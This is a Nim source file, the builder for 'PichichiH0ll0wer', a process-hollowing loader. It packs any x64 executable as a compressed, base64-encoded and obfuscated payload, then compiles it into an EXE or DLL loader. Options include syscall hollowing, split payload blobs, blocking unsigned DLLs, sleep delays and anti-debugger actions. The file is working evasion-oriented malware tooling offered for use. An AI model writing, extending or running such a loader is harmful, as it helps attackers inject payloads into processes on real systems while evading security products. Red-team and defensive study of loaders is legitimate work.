import osproc
import argparse
import ptr_math
import strformat
import winim/inc/[rpc, windef]
from std/base64 import encode
from zip/zlib import compress

# YOU HAVE TO HAVE A TOOL BANNER
const pichichiBanner = """

      ____  _      __    _      __    _    __  ______  ________                    
     / __ \(_)____/ /_  (_)____/ /_  (_)  / / / / __ \/ / / __ \_      _____  _____
    / /_/ / / ___/ __ \/ / ___/ __ \/ /  / /_/ / / / / / / / / / | /| / / _ \/ ___/
   / ____/ / /__/ / / / / /__/ / / / /  / __  / /_/ / / / /_/ /| |/ |/ /  __/ /    
  /_/   /_/\___/_/ /_/_/\___/_/ /_/_/  /_/ /_/\____/_/_/\____/ |__/|__/\___/_/     

                         .:=+++-:.
                      :+#%@@@%*+=:
                    =#@@@@%%%%#+-.    .::.
                  -#%#**+++++=-:::::.:--:.
        -..     :=*++===-------=======---:
        ::::..:+++++++++++++=============++=
        .-:::=*+++++###*****++++++++++**#%%%:
          ::=*+++++++#@@@%%%%%#*++++*#%%%%%-
           .***++++++**-:--==+*%#++#%####*+
           .***+++++#+      .::.+***:   .+#
           .**#*+*+**     .*%@%#-+*:-*+   #-
            *#%#+*+#=       **%@%+*.-#%:  **.
            =###+**#+      =#=%@*+#+-+=:.=*+=.
             #**#***#:     -*#*=-+:+**#####*=*-
             -#*%#***#-        :#*=*####***##**=
              +###****#*=::::=*##*#**************:
              =##**%#***######******************##=
            .+####*%%#**************************-=#*.
           :##*=##*#%#********************+*****.  +#=
          =#+:  *#####******************+=*#***+  :+##+.
        :**     =##%#******************+*##***#-  . +=+:
       -**=:    -#####***********#########****#.      .
      .===..    -######################**###*#+
                -#############################=
                :#############################-
                .#############################:
                 *##########*+=--:::-=*######*
                 =#######+:            =#####-
                 .#####*.               =###-
                  =###-                 .##:
              .....*#-::::..........:-=+**: ...........
  .................:+##*=-:..........:::-:.:......................                                                                 

    >>  Process hollowing loader
        https://github.com/itaymigdal/PichichiH0ll0wer
        By Itay Migdal
"""

# Declare arguments
var pePath: string
var injectionMethod: string
var sponsorPath: string
var sponsorParams: string
var outFormat: string
var outDllExportName: string  
var isBlockDlls: bool
var isSplit: bool
var sleepSeconds: string
var antiDebugAction: string
var isDebug: bool

# Define compiler args
var compileExeCmd = "nim compile --app:console"         # exe format
var compileDllCmd = "nim compile --app:lib --nomain"    # dll format
var compileExePath = " Loader/main.nim"                 # for source exe
var compileDllPath = " Loader/dll.nim"                  # for source dll
var compileOutExe = " -o:PichichiH0ll0wer.exe"          # for compiled exe
var compileOutDll = " -o:PichichiH0ll0wer.dll"          # for compiled dll
var compileFlags = " --cpu=amd64"                       # for windows 64 bit
compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size causing runtime errors
compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization


when isMainModule:
    # Define arguments
    var p = newParser:
        help(pichichiBanner)
        arg("exe-file", help="Exe file to load")
        arg("injection-method", help="""Injection method
        
        1 - Simple hollowing
        2 - Syscalls hollowing
        3 - Splitted hollowing using multiple processes
        4 - Splitted hollowing using multiple processes and syscalls
        """)
        option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
        option("-a", "--args", help="Command line arguments to append to the hollowed process")
        option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
        option("-e", "--export", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
        flag("-b", "--block", help="Block unsigned Microsoft Dlls in the hollowed process")
        flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
        option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
        option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
        flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
    # Parse arguments
    try:
        var opts = p.parse()
        pePath = opts.exe_file
        injectionMethod = opts.injection_method
        if opts.sponsor == "":
            sponsorPath = "getAppFilename()"
        else:
            sponsorPath = "protectString(r\"" & opts.sponsor & "\")"        
        sponsorParams = opts.args
        outFormat = opts.format
        outDllExportName = opts.export
        isBlockDlls = opts.block
        isSplit = opts.split
        sleepSeconds = opts.sleep
        antiDebugAction = opts.anti_debug
        isDebug = opts.debug
    except ShortCircuit as err:
        if err.flag == "argparse_help":
            echo err.help
            quit(1)
    except UsageError:
        echo pichichiBanner
        echo "[-] " & getCurrentExceptionMsg()
        echo "[i] Use -h / --help\n"
        quit(1)

    # Validate exe
    var peStr = readFile(pePath)
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageMagic = cast[size_t](peImageNtHeaders.OptionalHeader.Magic)
    if peImageMagic != 523 or not pePath.endsWith(".exe"):
        echo "[-] Payload is not a valid x64 exe format"
        quit(1)

    # Validate params
    if injectionMethod in ["3", "4"] and outFormat == "dll":
        echo "[-] Injection method isn't compatible with dll format"
        quit(1)

    # Compress & encode exe payload
    var compressedPe = compress(peStr)
    var compressedBase64PE = encode(compressedPe)

    # Write the parameters to the loader params
    var paramsPath = "Loader/params.nim"
    var compressedBase64PELine: string
    if isSplit:
        compressedBase64PELine = fmt"""var compressedBase64PE* = splitString(protectString("{compressedBase64PE}"))"""
    else:
        compressedBase64PELine = fmt"""var compressedBase64PE* = protectString("{compressedBase64PE}")"""
    var paramsToHollower = fmt"""
import os
import nimprotect

{compressedBase64PELine}
var sponsorPath* = {sponsorPath}
var sponsorParams* = protectString(r" {sponsorParams}")
var dllExportName* = protectString("{outDllExportName}") 
var isBlockDlls* = {isBlockDlls}
var antiDebugAction* = protectString("{antiDebugAction}")
var sleepSeconds* = {sleepSeconds}
    """
    writeFile(paramsPath, paramsToHollower)

    # Choose injection method
    if injectionMethod == "1":
        compileFlags.add(" -d:hollow1")
    elif injectionMethod == "2":
        compileFlags.add(" -d:hollow2")
    elif injectionMethod == "3":
        compileFlags.add(" -d:hollow3")
    elif injectionMethod == "4":
        compileFlags.add(" -d:hollow4")
    else:
        echo "[-] Injection method doesn't exist :("
        quit(1)

    # Change to debug if needed
    if isDebug:
        compileFlags = compileFlags.replace("-d:release ", "")

    # Compile
    var compileCmd: string
    if outFormat == "exe":
        compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
    elif outFormat == "dll":
        # Write the dll file that contains the export function
        var nimDllPath = "Loader/dll.nim"
        var nimDllcontent = fmt"""
import main
import params

proc NimMain() {{.cdecl, importc.}}

proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
    NimMain()
    main()
        """
        writeFile(nimDllPath, nimDllcontent)
        compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
    echo "[*] Compiling Loader: " & compileCmd
    var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
    if res[1] == 0:
        echo "[+] Compiled successfully"
        if injectionMethod in ["3", "4"]:
            echo "[i] Run the hollower with -M argument"
    else:
        echo "[-] Error compiling. compilation output:"
        echo res[0]


    
